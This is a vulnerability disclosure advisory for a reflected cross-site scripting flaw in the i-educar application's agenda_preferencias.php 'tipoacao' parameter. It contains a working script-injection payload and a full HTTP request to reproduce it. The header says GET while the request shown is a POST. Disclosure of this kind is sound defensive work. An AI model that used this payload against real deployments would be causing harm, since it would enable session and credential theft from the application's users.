# Cross-Site Scripting (XSS) Reflected endpoint `agenda_preferencias.php` parameter `tipoacao`

---

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability was identified in the `agenda_preferencias.php` endpoint of the _i-educar_ application. This vulnerability allows attackers to inject malicious scripts into the `tipoacao` parameter. The payload is reflected in the application’s HTTP response without proper sanitization, leading to immediate execution in the victim’s browser.

---

## Details

**Vulnerable Endpoint:** `GET /agenda_preferencias.php`  
**Parameter:** `tipoacao`

The application fails to properly validate and sanitize user input in the `tipoacao` parameter. An attacker can craft a malicious URL containing a JavaScript payload, which is reflected back in the server’s response and executed when a victim accesses the crafted link.

---

## PoC

**Payload:**

`"><script>alert('XSS-PoC')</script>`

### Steps to Reproduce:

1. Log in to the _i-educar_ application.
    
2. Make a request using Caido similar to the one below.

```
POST /intranet/agenda_preferencias.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/intranet/agenda_preferencias.php
Cookie: [PUT NEW COOKIE]
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

tipoacao=Editar"><script>alert('XSS-PoC')</script>&cod_agenda=2&envia_alerta=0&agenda_display=2
```

<img width="840" height="583" alt="Pasted image 20250816233021" src="https://github.com/user-attachments/assets/b312f674-be8a-4f2d-8370-375b0a3f6708" />


The result:
<img width="736" height="565" alt="Pasted image 20250816233448" src="https://github.com/user-attachments/assets/0c46fe97-a273-4c6f-9840-39f3e2babd73" />



---

## Impact

Reflected XSS vulnerabilities can lead to severe consequences, including:

- **Session hijacking:** Theft of cookies or authentication tokens
    
- **Credential theft:** Capturing sensitive user credentials via injected scripts
    
- **Malware delivery:** Redirecting victims to malicious downloads or exploit pages
    
- **Phishing attacks:** Displaying deceptive forms or content to steal user data
    
- **Reputation damage:** Exploiting trust between the application and its users
    
- **Client-side manipulation:** Altering the application’s content and behavior dynamically


## Discoverer

[Marcelo Queiroz](www.linkedin.com/in/marceloqueirozjr)

by [CVE-Hunters](https://github.com/Sec-Dojo-Cyber-House/cve-hunters)
